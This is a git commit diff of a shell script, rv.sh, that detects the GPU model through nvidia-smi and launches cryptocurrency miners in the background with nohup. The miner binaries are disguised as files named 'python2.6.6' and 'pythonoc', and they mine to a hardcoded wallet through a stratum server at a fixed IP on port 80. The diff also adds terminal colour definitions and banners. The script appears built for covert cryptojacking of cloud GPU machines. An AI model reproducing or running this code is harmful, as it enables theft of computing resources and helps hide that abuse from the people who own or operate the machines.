c527393aa9fbc91215c78428da3002a68884ea96
Ayoub Jadouli <Ayoub JADOULI>
2021-04-11 17:51:51 +0000

    just rv

--- rv.sh
+++ rv.sh
@@ -1,13 +1,97 @@
-#!bin/bash -xe 
+#!bin/bash -xe
 
 ## getting IP info
 iip=$(curl -s https://ipecho.net/plain)
 IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
-echo '#######################################################'
-echo '################## RV + XM v0.1.0      ################'
-echo '#######################################################'
+PROX=116.203.10.54
+RVPort=80
+
+## COLORS
+# Reset
+Color_Off='\033[0m'       # Text Reset
+
+# Regular Colors
+Black='\033[0;30m'        # Black
+Red='\033[0;31m'          # Red
+Green='\033[0;32m'        # Green
+Yellow='\033[0;33m'       # Yellow
+Blue='\033[0;34m'         # Blue
+Purple='\033[0;35m'       # Purple
+Cyan='\033[0;36m'         # Cyan
+White='\033[0;37m'        # White
+
+# Bold
+BBlack='\033[1;30m'       # Black
+BRed='\033[1;31m'         # Red
+BGreen='\033[1;32m'       # Green
+BYellow='\033[1;33m'      # Yellow
+BBlue='\033[1;34m'        # Blue
+BPurple='\033[1;35m'      # Purple
+BCyan='\033[1;36m'        # Cyan
+BWhite='\033[1;37m'       # White
+
+# Underline
+UBlack='\033[4;30m'       # Black
+URed='\033[4;31m'         # Red
+UGreen='\033[4;32m'       # Green
+UYellow='\033[4;33m'      # Yellow
+UBlue='\033[4;34m'        # Blue
+UPurple='\033[4;35m'      # Purple
+UCyan='\033[4;36m'        # Cyan
+UWhite='\033[4;37m'       # White
+
+# Background
+On_Black='\033[40m'       # Black
+On_Red='\033[41m'         # Red
+On_Green='\033[42m'       # Green
+On_Yellow='\033[43m'      # Yellow
+On_Blue='\033[44m'        # Blue
+On_Purple='\033[45m'      # Purple
+On_Cyan='\033[46m'        # Cyan
+On_White='\033[47m'       # White
+
+# High Intensity
+IBlack='\033[0;90m'       # Black
+IRed='\033[0;91m'         # Red
+IGreen='\033[0;92m'       # Green
+IYellow='\033[0;93m'      # Yellow
+IBlue='\033[0;94m'        # Blue
+IPurple='\033[0;95m'      # Purple
+ICyan='\033[0;96m'        # Cyan
+IWhite='\033[0;97m'       # White
+
+# Bold High Intensity
+BIBlack='\033[1;90m'      # Black
+BIRed='\033[1;91m'        # Red
+BIGreen='\033[1;92m'      # Green
+BIYellow='\033[1;93m'     # Yellow
+BIBlue='\033[1;94m'       # Blue
+BIPurple='\033[1;95m'     # Purple
+BICyan='\033[1;96m'       # Cyan
+BIWhite='\033[1;97m'      # White
+
+# High Intensity backgrounds
+On_IBlack='\033[0;100m'   # Black
+On_IRed='\033[0;101m'     # Red
+On_IGreen='\033[0;102m'   # Green
+On_IYellow='\033[0;103m'  # Yellow
+On_IBlue='\033[0;104m'    # Blue
+On_IPurple='\033[0;105m'  # Purple
+On_ICyan='\033[0;106m'    # Cyan
+On_IWhite='\033[0;107m'   # White
+
+
+
+
+
+
+
+
+echo '##########################################################################'
+echo '################## '"RV to $PROX:$RVPort"' Ver:0.0.1     ################'
+echo '##########################################################################'
 
 echo > oout
 
@@ -18,39 +102,42 @@ chmod +x python2.6.6
 cp python2.6.6 pythonoc
 
 # exec
+i="0"
 while true
 do
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
 
+echo "$On_IGreen"'                                  #########################'
 echo "####################### P100-PCIE #########################"
-nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_CU_P100_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &
+echo '#######################                                    '"$Color_Off"
+nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_CU_P100_$IPNAME@$PROX:$RVPort  -U 2>> oout 1>> oout &
 
 elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
 then
-echo '                                  #########################'
-echo "####################### P100-PCIE #########################"
-echo '#######################                                    '
-nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_T4_$IPNAME@116.203.10.54:80  -G  2>> oout 1>> oout &
+echo "$ON_IBlue"'                                  #########################'
+echo "#######################        T4        #########################"
+echo '#######################                                    '"$Color_Off"
+nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_T4_$IPNAME@$PROX:$RVPort  -G  2>> oout 1>> oout &
 elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
 then
-echo '                                   #########################'
+echo "$ON_IRed"'                            #########################'
 echo "#######################    K80     #########################"
-echo '#######################                                    '
-nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_K80_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
+echo '#######################                                    '"$Color_Off"
+nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_K80_$IPNAME@$PROX:$RVPort  -G 2>> oout 1>> oout &
 elif [ $(nvidia-smi | grep P4 |wc -l) == 1 ]
 then
-echo '                                   #########################'
+echo "$On_IYellow"'                                   ########################'
 echo "#######################    P4     #########################"
-echo '#######################                                    '
-nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_P4_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &
+echo '#######################                                    '"$Color_Off"
+nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_P4_$IPNAME@$PROX:$RVPort  -U 2>> oout 1>> oout &
 else
-echo '                                  #########################'
-echo "#######################     P4    #########################"
-echo '#######################                                    '
-nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_Other_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
+echo "$On_IBlack"'                                     #########################'
+echo "#######################     Other    #########################"
+echo '#######################                                       '"$Color_Off"
+nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_Other_$IPNAME@$PROX:$RVPort  -G 2>> oout 1>> oout &
 fi
-i="0"
+
     while true
     do
         i=$[$i+1]
@@ -58,5 +145,8 @@ i="0"
         sleep 30
     done
 
+
+echo "#######################   Process  Killed    #########################"
+                  
 done
 tail -f oout
